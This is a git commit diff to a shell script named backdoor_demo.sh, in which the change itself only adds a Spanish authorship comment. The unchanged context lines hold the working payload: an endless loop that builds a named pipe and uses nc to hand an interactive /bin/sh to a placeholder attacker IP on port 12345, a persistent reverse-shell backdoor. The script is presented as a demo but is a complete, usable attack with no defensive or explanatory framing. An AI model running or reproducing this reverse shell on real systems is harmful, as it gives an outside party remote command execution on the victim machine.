b829f183bc42c69721603c3742ab579b1a3f881a
peraLimonera <66177825+peraLimonera@users.noreply.github.com>
2020-06-01 01:24:42 +0100

    Update backdoor_demo.sh

--- backdoor_demo.sh
+++ backdoor_demo.sh
@@ -1,5 +1,7 @@
 #!/bin/sh
 
+#codigo desarrollado por peraLimoner4
+
 while [ 1 ]; do
 	rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc  /put_the_atacker_ip_here 12345 > /tmp/f 
 done
